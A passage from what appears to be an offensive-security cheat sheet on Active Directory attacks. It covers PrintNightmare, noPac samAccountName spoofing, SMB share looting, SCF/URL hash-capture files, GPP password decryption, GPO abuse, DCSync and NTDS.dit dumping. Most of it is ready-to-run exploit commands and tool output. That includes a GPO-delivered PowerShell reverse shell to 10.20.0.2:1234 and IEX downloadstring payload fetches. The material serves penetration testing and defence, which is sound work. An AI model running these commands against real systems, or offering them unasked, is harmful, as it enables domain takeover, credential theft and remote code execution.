egrep 'MS-RPRN|MS-PAR'\nProtocol: [MS-RPRN]: Print System Remote Protocol\n</code></pre> * It Was All A Dream <pre><code>git clone https://github.com/byt3bl33d3r/ItWasAllADream\ncd ItWasAllADream &amp;&amp; poetry install &amp;&amp; poetry shell\nitwasalladream -u user -p Password123 -d domain 10.10.10.10/24\ndocker run -it itwasalladream -u username -p Password123 -d domain 10.10.10.10\n</code></pre></p> <p>Payload Hosting:  * The payload can be hosted on Impacket SMB server since PR #1109: <pre><code>python3 ./smbserver.py share /tmp/smb/\n</code></pre> * Using Invoke-BuildAnonymousSMBServer (Admin rights required on host):  <pre><code>Import-Module .\\Invoke-BuildAnonymousSMBServer.ps1; Invoke-BuildAnonymousSMBServer -Path C:\\Share -Mode Enable\n</code></pre> * Using WebDav with SharpWebServer (Doesn't require admin rights): <pre><code>SharpWebServer.exe port=8888 dir=c:\\users\\public verbose=true\n</code></pre> When using WebDav instead of SMB, you must add <code>@[PORT]</code> to the hostname in the URI, e.g.: <code>\\\\172.16.1.5@8888\\Downloads\\beacon.dll</code> WebDav client must be activated on exploited target. By default it is not activated on Windows workstations (you have to <code>net start webclient</code>) and it's not installed on servers. Here is how to detect activated webdav: <pre><code>cme smb -u user -p password -d domain.local -M webdav [TARGET]\n</code></pre></p> <p>Trigger the exploit: </p> <ul> <li>SharpNightmare <pre><code># require a modified Impacket: https://github.com/cube0x0/impacket\npython3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\\\192.168.1.215\\smb\\addCube.dll'\npython3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\\addCube.dll'\n## LPE\nSharpPrintNightmare.exe C:\\addCube.dll\n## RCE using existing context\nSharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll' 'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_addb31f9bff9e936\\Amd64\\UNIDRV.DLL' '\\\\192.168.1.20'\n## RCE using runas /netonly\nSharpPrintNightmare.exe '\\\\192.168.1.215\\smb\\addCube.dll'  'C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL' '\\\\192.168.1.10' hackit.local domain_user Pass123\n</code></pre></li> <li>Invoke-Nightmare <pre><code>## LPE only (PS1 + DLL)\nImport-Module .\\cve-2021-1675.ps1\nInvoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default\nInvoke-Nightmare -DriverName \"Dementor\" -NewUser \"d3m3nt0r\" -NewPassword \"AzkabanUnleashed123*\" \nInvoke-Nightmare -DLL \"C:\\absolute\\path\\to\\your\\bindshell.dll\"\n</code></pre></li> <li>Mimikatz v2.2.0-20210709+ <pre><code>## LPE\nmisc::printnightmare /server:DC01 /library:C:\\Users\\user1\\Documents\\mimispool.dll\n## RCE\nmisc::printnightmare /server:CASTLE /library:\\\\10.0.2.12\\smb\\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50\n</code></pre></li> <li>PrintNightmare - @outflanknl <pre><code>PrintNightmare [target ip or hostname] [UNC path to payload Dll] [optional domain] [optional username] [optional password]\n</code></pre></li> </ul> <p>Debug informations</p> Error Message Debug 0x5 <code>rpc_s_access_denied</code> Permissions on the file in the SMB share 0x525 <code>ERROR_NO_SUCH_USER</code> The specified account does not exist. 0x180 unknown error code Share is not SMB2"},{"location":"active-directory/active-directory-attacks/#samaccountname-spoofing","title":"samAccountName spoofing","text":"<p>During S4U2Self, the KDC will try to append a '\\$' to the computer name specified in the TGT, if the computer name is not found. An attacker can create a new machine account with the sAMAccountName set to a domain controller's sAMAccountName - without the '\\$'. For instance, suppose there is a domain controller with a sAMAccountName set to 'DC\\$'. An attacker would then create a machine account with the sAMAccountName set to 'DC'. The attacker can then request a TGT for the newly created machine account. After the TGT has been issued by the KDC, the attacker can rename the newly created machine account to something different, e.g. JOHNS-PC. The attacker can then perform S4U2Self and request a ST to itself as any user. Since the machine account with the sAMAccountName set to 'DC' has been renamed, the KDC will try to find the machine account by appending a '$', which will then match the domain controller. The KDC will then issue a valid ST for the domain controller. Requirements</p> <ul> <li>MachineAccountQuota &gt; 0</li> </ul> <p>Check for exploitation</p> <ol> <li>Check the MachineAccountQuota of the account   <pre><code>crackmapexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ\nStandIn.exe --object ms-DS-MachineAccountQuota=*\n</code></pre></li> <li>Check if the DC is vulnerable   <pre><code>crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M nopac\n</code></pre></li> </ol> <p>Exploitation</p> <ol> <li>Create a computer account     <pre><code>impacket@linux&gt; addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'\npowermad@windows&gt; . .\\Powermad.ps1\npowermad@windows&gt; $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force\npowermad@windows&gt; New-MachineAccount -MachineAccount \"ControlledComputer\" -Password $($password) -Domain \"domain.local\" -DomainController \"DomainController.domain.local\" -Verbose\nsharpmad@windows&gt; Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword\n</code></pre></li> <li>Clear the controlled machine account <code>servicePrincipalName</code> attribute     <pre><code>impacket@linux&gt; addspn.py -u 'domain\\user' -p 'password' -t 'ControlledComputer$' -c DomainController\npowershell@windows&gt; . .\\Powerview.ps1\npowershell@windows&gt; Set-DomainObject \"CN=ControlledComputer,CN=Computers,DC=domain,DC=local\" -Clear 'serviceprincipalname' -Verbose\n</code></pre></li> <li>(CVE-2021-42278) Change the controlled machine account <code>sAMAccountName</code> to a Domain Controller's name without the trailing <code>$</code> <pre><code># https://github.com/SecureAuthCorp/impacket/pull/1224\nimpacket@linux&gt; renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'\npowermad@windows&gt; Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"DomainController\" -Attribute samaccountname -Verbose\n</code></pre></li> <li>Request a TGT for the controlled machine account     <pre><code>impacket@linux&gt; getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'\ncmd@windows&gt; Rubeus.exe asktgt /user:\"DomainController\" /password:\"ComputerPassword\" /domain:\"domain.local\" /dc:\"DomainController.domain.local\" /nowrap\n</code></pre></li> <li>Reset the controlled machine account sAMAccountName to its old value      <pre><code>impacket@linux&gt; renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'\npowermad@windows&gt; Set-MachineAccountAttribute -MachineAccount \"ControlledComputer\" -Value \"ControlledComputer\" -Attribute samaccountname -Verbose\n</code></pre></li> <li>(CVE-2021-42287) Request a service ticket with <code>S4U2self</code> by presenting the TGT obtained before     <pre><code># https://github.com/SecureAuthCorp/impacket/pull/1202\nimpacket@linux&gt; KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'\ncmd@windows&gt; Rubeus.exe s4u /self /impersonateuser:\"DomainAdmin\" /altservice:\"ldap/DomainController.domain.local\" /dc:\"DomainController.domain.local\" /ptt /ticket:[Base64 TGT]\n</code></pre></li> <li>DCSync: <code>KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'</code></li> </ol> <p>Automated exploitation:</p> <ul> <li>cube0x0/noPac - Windows     <pre><code>noPac.exe scan -domain htb.local -user user -pass 'password123'\nnoPac.exe -domain htb.local -user domain_user -pass 'Password123!' /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service cifs /ptt\nnoPac.exe -domain htb.local -user domain_user -pass \"Password123!\" /dc dc.htb.local /mAccount demo123 /mPassword Password123! /service ldaps /ptt /impersonate Administrator\n</code></pre></li> <li>Ridter/noPac - Linux   <pre><code>python noPac.py 'domain.local/user' -hashes ':31d6cfe0d16ae931b73c59d7e0c089c0' -dc-ip 10.10.10.10 -use-ldap -dump\n</code></pre></li> <li>WazeHell/sam-the-admin <pre><code>$ python3 sam_the_admin.py \"domain/user:password\" -dc-ip 10.10.10.10 -shell\n[*] Selected Target dc.caltech.white                                              \n[*] Total Domain Admins 11                                                        \n[*] will try to impersonat gaylene.dreddy                                         \n[*] Current ms-DS-MachineAccountQuota = 10                                        \n[*] Adding Computer Account \"SAMTHEADMIN-11$\"                                     \n[*] MachineAccount \"SAMTHEADMIN-11$\" password = EhFMT%mzmACL                      \n[*] Successfully added machine account SAMTHEADMIN-11$ with password EhFMT%mzmACL.\n[*] SAMTHEADMIN-11$ object = CN=SAMTHEADMIN-11,CN=Computers,DC=caltech,DC=white   \n[*] SAMTHEADMIN-11$ sAMAccountName == dc                                          \n[*] Saving ticket in dc.ccache                                                    \n[*] Resting the machine account to SAMTHEADMIN-11$                                \n[*] Restored SAMTHEADMIN-11$ sAMAccountName to original value                     \n[*] Using TGT from cache                                                          \n[*] Impersonating gaylene.dreddy                                                  \n[*]     Requesting S4U2self                                                       \n[*] Saving ticket in gaylene.dreddy.ccache                                        \n[!] Launching semi-interactive shell - Careful what you execute                   \nC:\\Windows\\system32&gt;whoami                                                        \nnt authority\\system \n</code></pre></li> <li>ly4k/Pachine <pre><code>usage: pachine.py [-h] [-scan] [-spn SPN] [-impersonate IMPERSONATE] [-domain-netbios NETBIOSNAME] [-computer-name NEW-COMPUTER-NAME$] [-computer-pass password] [-debug] [-method {SAMR,LDAPS}] [-port {139,445,636}] [-baseDN DC=test,DC=local]\n              [-computer-group CN=Computers,DC=test,DC=local] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] -dc-host hostname [-dc-ip ip]\n              [domain/]username[:password]\n$ python3 pachine.py -dc-host dc.domain.local -scan 'domain.local/john:Passw0rd!'\n$ python3 pachine.py -dc-host dc.domain.local -spn cifs/dc.domain.local -impersonate administrator 'domain.local/john:Passw0rd!'\n$ export KRB5CCNAME=$PWD/administrator@domain.local.ccache\n$ impacket-psexec -k -no-pass 'domain.local/administrator@dc.domain.local'\n</code></pre></li> </ul> <p>Mitigations: * KB5007247 - Windows Server 2012 R2 * KB5008601 - Windows Server 2016 * KB5008602 - Windows Server 2019 * KB5007205 - Windows Server 2022 * KB5008102 * KB5008380</p>"},{"location":"active-directory/active-directory-attacks/#open-shares","title":"Open Shares","text":"<p>Some shares can be accessible without authentication, explore them to find some juicy files * ShawnDEvans/smbmap - a handy SMB enumeration tool <pre><code>smbmap -H 10.10.10.10                # null session\nsmbmap -H 10.10.10.10 -r [PATH]      # recursive listing\nsmbmap -H 10.10.10.10 -u invaliduser # guest smb session\nsmbmap -H 10.10.10.10 -d \"DOMAIN.LOCAL\" -u \"USERNAME\" -p \"Password123*\"\n</code></pre></p> <ul> <li> <p>byt3bl33d3r/pth-smbclient from path-toolkit <pre><code>pth-smbclient -U \"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\" //192.168.10.100/Share\npth-smbclient -U \"AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A\" //192.168.10.100/C$\nls  # list files\ncd  # move inside a folder\nget # download files\nput # replace a file\n</code></pre></p> </li> <li> <p>SecureAuthCorp/smbclient from Impacket <pre><code>smbclient -I 10.10.10.100 -L ACTIVE -N -U \"\"\n        Sharename       Type      Comment\n        ---------       ----      -------\n        ADMIN$          Disk      Remote Admin\n        C$              Disk      Default share\n        IPC$            IPC       Remote IPC\n        NETLOGON        Disk      Logon server share\n        Replication     Disk      \n        SYSVOL          Disk      Logon server share\n        Users           Disk\nuse Sharename # select a Sharename\ncd Folder     # move inside a folder\nls            # list files\n</code></pre></p> </li> <li> <p>smbclient - from Samba, ftp-like client to access SMB/CIFS resources on servers <pre><code>smbclient -U username //10.0.0.1/SYSVOL\nsmbclient //10.0.0.1/Share\n# Download a folder recursively\nsmb: \\&gt; mask \"\"\nsmb: \\&gt; recurse ON\nsmb: \\&gt; prompt OFF\nsmb: \\&gt; lcd '/path/to/go/'\nsmb: \\&gt; mget *\n</code></pre></p> </li> <li> <p>SnaffCon/Snaffler - a tool for pentesters to help find delicious candy <pre><code>snaffler.exe -s - snaffler.log\n# Snaffle all the computers in the domain\n./Snaffler.exe -d domain.local -c &lt;DC&gt; -s\n# Snaffle specific computers\n./Snaffler.exe -n computer1,computer2 -s\n\u200b\n# Snaffle a specific directory\n./Snaffler.exe -i C:\\ -s\n</code></pre></p> </li> </ul>"},{"location":"active-directory/active-directory-attacks/#scf-and-url-file-attack-against-writeable-share","title":"SCF and URL file attack against writeable share","text":"<p>Theses attacks can be automated with Farmer.exe and Crop.exe</p> <pre><code># Farmer to receive auth\nfarmer.exe &lt;port&gt; [seconds] [output]\nfarmer.exe 8888 0 c:\\windows\\temp\\test.tmp # undefinitely\nfarmer.exe 8888 60 # one minute\n# Crop can be used to create various file types that will trigger SMB/WebDAV connections for poisoning file shares during hash collection attacks\ncrop.exe &lt;output folder&gt; &lt;output filename&gt; &lt;WebDAV server&gt; &lt;LNK value&gt; [options]\nCrop.exe \\\\\\\\fileserver\\\\common mdsec.url \\\\\\\\workstation@8888\\\\mdsec.ico\nCrop.exe \\\\\\\\fileserver\\\\common mdsec.library-ms \\\\\\\\workstation@8888\\\\mdsec\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#scf-files","title":"SCF Files","text":"<p>Drop the following <code>@something.scf</code> file inside a share and start listening with Responder : <code>responder -wrf --lm -v -I eth0</code></p> <pre><code>[Shell]\nCommand=2\nIconFile=\\\\10.10.10.10\\Share\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n</code></pre> <p>Using <code>crackmapexec</code>:</p> <pre><code>crackmapexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf\ncrackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk\ncrackmapexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#url-files","title":"URL Files","text":"<p>This attack also works with <code>.url</code> files and <code>responder -I eth0 -v</code>.</p> <pre><code>[InternetShortcut]\nURL=whatever\nWorkingDirectory=whatever\nIconFile=\\\\10.10.10.10\\%USERNAME%.icon\nIconIndex=1\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#windows-library-files","title":"Windows Library Files","text":"<p>Windows Library Files (.library-ms) <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;libraryDescription xmlns=\"&lt;http://schemas.microsoft.com/windows/2009/library&gt;\"&gt;\n  &lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;\n  &lt;version&gt;6&lt;/version&gt;\n  &lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;\n  &lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;\n  &lt;templateInfo&gt;\n    &lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;\n  &lt;/templateInfo&gt;\n  &lt;searchConnectorDescriptionList&gt;\n    &lt;searchConnectorDescription&gt;\n      &lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;\n      &lt;isSupported&gt;false&lt;/isSupported&gt;\n      &lt;simpleLocation&gt;\n        &lt;url&gt;\\\\\\\\workstation@8888\\\\folder&lt;/url&gt;\n      &lt;/simpleLocation&gt;\n    &lt;/searchConnectorDescription&gt;\n  &lt;/searchConnectorDescriptionList&gt;\n&lt;/libraryDescription&gt;\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#windows-search-connectors-files","title":"Windows Search Connectors Files","text":"<p>Windows Search Connectors (.searchConnector-ms) <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;searchConnectorDescription xmlns=\"&lt;http://schemas.microsoft.com/windows/2009/searchConnector&gt;\"&gt;\n    &lt;iconReference&gt;imageres.dll,-1002&lt;/iconReference&gt;\n    &lt;description&gt;Microsoft Outlook&lt;/description&gt;\n    &lt;isSearchOnlyItem&gt;false&lt;/isSearchOnlyItem&gt;\n    &lt;includeInStartMenuScope&gt;true&lt;/includeInStartMenuScope&gt;\n    &lt;iconReference&gt;\\\\\\\\workstation@8888\\\\folder.ico&lt;/iconReference&gt;\n    &lt;templateInfo&gt;\n        &lt;folderType&gt;{91475FE5-586B-4EBA-8D75-D17434B8CDF6}&lt;/folderType&gt;\n    &lt;/templateInfo&gt;\n    &lt;simpleLocation&gt;\n        &lt;url&gt;\\\\\\\\workstation@8888\\\\folder&lt;/url&gt;\n    &lt;/simpleLocation&gt;\n&lt;/searchConnectorDescription&gt;\n</code></pre></p>"},{"location":"active-directory/active-directory-attacks/#passwords-in-sysvol-group-policy-preferences","title":"Passwords in SYSVOL &amp; Group Policy Preferences","text":"<p>Find password in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: <code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>.</p> <pre><code>findstr /S /I cpassword \\\\&lt;FQDN&gt;\\sysvol\\&lt;FQDN&gt;\\policies\\*.xml\n</code></pre> <p>Decrypt a Group Policy Password found in SYSVOL (by 0x00C651E0), using the 32-byte AES key provided by Microsoft in the MSDN - 2.2.1.1.4 Password Encryption</p> <pre><code>echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000\n\ne.g: \necho '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000\n\necho 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#automate-the-sysvol-and-passwords-research","title":"Automate the SYSVOL and passwords research","text":"<ul> <li> <p><code>Metasploit</code> modules to enumerate shares and credentials     <pre><code>scanner/smb/smb_enumshares\npost/windows/gather/enum_shares\npost/windows/gather/credentials/gpp\n</code></pre></p> </li> <li> <p>CrackMapExec modules     <pre><code>cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin\ncme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password\n</code></pre></p> </li> <li> <p>Get-GPPPassword <pre><code># with a NULL session\nGet-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'\n# with cleartext credentials\nGet-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'\n# pass-the-hash\nGet-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'\n</code></pre></p> </li> </ul>"},{"location":"active-directory/active-directory-attacks/#mitigations_1","title":"Mitigations","text":"<ul> <li>Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.</li> <li>Delete existing GPP xml files in SYSVOL containing passwords.</li> <li>Don\u2019t put passwords in files that are accessible by all authenticated users.</li> </ul>"},{"location":"active-directory/active-directory-attacks/#exploit-group-policy-objects-gpo","title":"Exploit Group Policy Objects GPO","text":"<p>Creators of a GPO are automatically granted explicit Edit settings, delete, modify security, which manifests as CreateChild, DeleteChild, Self, WriteProperty, DeleteTree, Delete, GenericRead, WriteDacl, WriteOwner  GPO Priorization : Organization Unit &gt; Domain &gt; Site &gt; Local</p> <p>GPO are stored in the DC in <code>\\\\&lt;domain.dns&gt;\\SYSVOL\\&lt;domain.dns&gt;\\Policies\\&lt;GPOName&gt;\\</code>, inside two folders User and Machine. If you have the right to edit the GPO you can connect to the DC and replace the files. Planned Tasks are located at <code>Machine\\Preferences\\ScheduledTasks</code>.</p> <p> Domain members refresh group policy settings every 90 minutes with a random offset of 0 to 30 minutes but it can locally be forced with the following command: <code>gpupdate /force</code>. </p>"},{"location":"active-directory/active-directory-attacks/#find-vulnerable-gpo","title":"Find vulnerable GPO","text":"<p>Look a GPLink where you have the Write right.</p> <pre><code>Get-DomainObjectAcl -Identity \"SuperSecureGPO\" -ResolveGUIDs |  Where-Object {($_.ActiveDirectoryRights.ToString() -match \"GenericWrite|AllExtendedWrite|WriteDacl|WriteProperty|WriteMember|GenericAll|WriteOwner\")}\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#abuse-gpo-with-sharpgpoabuse","title":"Abuse GPO with SharpGPOAbuse","text":"<pre><code># Build and configure SharpGPOAbuse\n$ git clone https://github.com/FSecureLABS/SharpGPOAbuse\n$ Install-Package CommandLineParser -Version 1.9.3.15\n$ ILMerge.exe /out:C:\\SharpGPOAbuse.exe C:\\Release\\SharpGPOAbuse.exe C:\\Release\\CommandLine.dll\n# Adding User Rights\n.\\SharpGPOAbuse.exe --AddUserRights --UserRights \"SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight\" --UserAccount bob.smith --GPOName \"Vulnerable GPO\"\n# Adding a Local Admin\n.\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName \"Vulnerable GPO\"\n# Configuring a User or Computer Logon Script\n.\\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\\\"\" --GPOName \"Vulnerable GPO\"\n# Configuring a Computer or User Immediate Task\n# /!\\ Intended to \"run once\" per GPO refresh, not run once per system\n.\\SharpGPOAbuse.exe --AddComputerTask --TaskName \"Update\" --Author DOMAIN\\Admin --Command \"cmd.exe\" --Arguments \"/c powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\\\"\" --GPOName \"Vulnerable GPO\"\n.\\SharpGPOAbuse.exe --AddComputerTask --GPOName \"VULNERABLE_GPO\" --Author 'LAB.LOCAL\\User' --TaskName \"EvilTask\" --Arguments  \"/c powershell.exe -nop -w hidden -enc BASE64_ENCODED_COMMAND \" --Command \"cmd.exe\" --Force\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#abuse-gpo-with-powergpoabuse","title":"Abuse GPO with PowerGPOAbuse","text":"<ul> <li>https://github.com/rootSySdk/PowerGPOAbuse</li> </ul> <pre><code>PS&gt; . .\\PowerGPOAbuse.ps1\n# Adding a localadmin \nPS&gt; Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'\n# Assign a new right \nPS&gt; Add-UserRights -Rights \"SeLoadDriverPrivilege\",\"SeDebugPrivilege\" -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'\n# Adding a New Computer/User script \nPS&gt; Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'\n# Create an immediate task \nPS&gt; Add-GPOImmediateTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments \"'$(Get-Content evil.ps1)'\" -Author Administrator -Scope Computer/User -GPOIdentity 'SuperSecureGPO'\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#abuse-gpo-with-pygpoabuse","title":"Abuse GPO with pyGPOAbuse","text":"<pre><code>$ git clone https://github.com/Hackndo/pyGPOAbuse\n# Add john user to local administrators group (Password: H4x00r123..)\n./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\"\n# Reverse shell example\n./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id \"12345677-ABCD-9876-ABCD-123456789012\" \\ \n    -powershell \\ \n    -command \"\\$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);\\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%{0};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2&gt;&amp;1 | Out-String );\\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '&gt; ';\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()};\\$client.Close()\" \\ \n    -taskname \"Completely Legit Task\" \\\n    -description \"Dis is legit, pliz no delete\" \\ \n    -user\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#abuse-gpo-with-powerview","title":"Abuse GPO with PowerView","text":"<pre><code># Enumerate GPO\nGet-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}\n# New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO\nNew-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#abuse-gpo-with-standin","title":"Abuse GPO with StandIn","text":"<pre><code># Add a local administrator\nStandIn.exe --gpo --filter Shards --localadmin user002\n# Set custom right to a user\nStandIn.exe --gpo --filter Shards --setuserrights user002 --grant \"SeDebugPrivilege,SeLoadDriverPrivilege\"\n# Execute a custom command\nStandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author \"REDHOOK\\Administrator\" --command \"C:\\I\\do\\the\\thing.exe\" --args \"with args\"\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#dumping-ad-domain-credentials","title":"Dumping AD Domain Credentials","text":"<p>You will need the following files to extract the ntds :  - NTDS.dit file - SYSTEM hive (<code>C:\\Windows\\System32\\SYSTEM</code>)</p> <p>Usually you can find the ntds in two locations : <code>systemroot\\NTDS\\ntds.dit</code> and <code>systemroot\\System32\\ntds.dit</code>. - <code>systemroot\\NTDS\\ntds.dit</code> stores the database that is in use on a domain controller. It contains the values for the domain and a replica of the values for the forest (the Configuration container data). - <code>systemroot\\System32\\ntds.dit</code> is the distribution copy of the default directory that is used when you install Active Directory on a server running Windows Server 2003 or later to create a domain controller. Because this file is available, you can run the Active Directory Installation Wizard without having to use the server operating system CD.</p> <p>However you can change the location to a custom one, you will need to query the registry to get the current location.</p> <pre><code>reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters /v \"DSA Database file\"\n</code></pre>"},{"location":"active-directory/active-directory-attacks/#dcsync-attack","title":"DCSync Attack","text":"<p>DCSync is a technique used by attackers to obtain sensitive information, including password hashes, from a domain controller in an Active Directory environment. Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data. </p> <ul> <li>DCSync only one user   <pre><code>mimikatz# lsadump::dcsync /domain:htb.local /user:krbtgt\n</code></pre></li> <li>DCSync all users of the domain   <pre><code>mimikatz# lsadump::dcsync /domain:htb.local /all /csv\ncrackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds\ncrackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi\n</code></pre></li> </ul> <p> OPSEC NOTE: Replication is always done between 2 Computers. Doing a DCSync from a user account can raise alerts.</p>"},{"location":"active-directory/active-directory-attacks/#volume-shadow-copy","title":"Volume Shadow Copy","text":"<p>The VSS is a Windows service that allows users to create snapshots or backups of their data at a specific point in time. Attackers can abuse this service to access and copy sensitive data, even if it is currently being used or locked by another process.</p> <ul> <li>windows-commands/vssadmin <pre><code>vssadmin create shadow /for=C:\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\NTDS.dit C:\\ShadowCopy\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\ShadowCopy\n</code></pre></li> <li>windows-commands/ntdsutil <pre><code>ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q\n</code></pre></li> <li>CrackMapExec VSS module <pre><code>cme smb 10.10.0.202 -u username -p password --ntds vss\n</code></pre></li> </ul>"},{"location":"active-directory/active-directory-attacks/#extract-hashes-from-ntdsdit","title":"Extract hashes from ntds.dit","text":"<p>then you need to use secretsdump to extract the hashes, use the <code>LOCAL</code> options to use it on a retrieved ntds.dit</p> <pre><code>secretsdump.py -system /root/SYSTEM -ntds /root/ntds.dit LOCAL\n</code></pre> <p>secretsdump also works remotely</p> <pre><code>./secretsdump.py -dc-ip IP AD\\administrator@domain -use-vss -pwd-last-set -user-status \n./secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\\$@10.0.0.1\n</code></pre> <ul> <li><code>-pwd-last-set</code>: Shows pwdLastSet attribute for each NTDS.DIT account.</li> <li><code>-user-status</code>: Display whether or not the user is disabled.</li> </ul>"},{"location":"active-directory/active-directory-attacks/#using-mimikatz-sekurlsa","title":"Using Mimikatz sekurlsa","text":"<p>Dumps credential data in an Active Directory domain when run on a Domain Controller.  Requires administrator access with debug or Local SYSTEM rights</p> 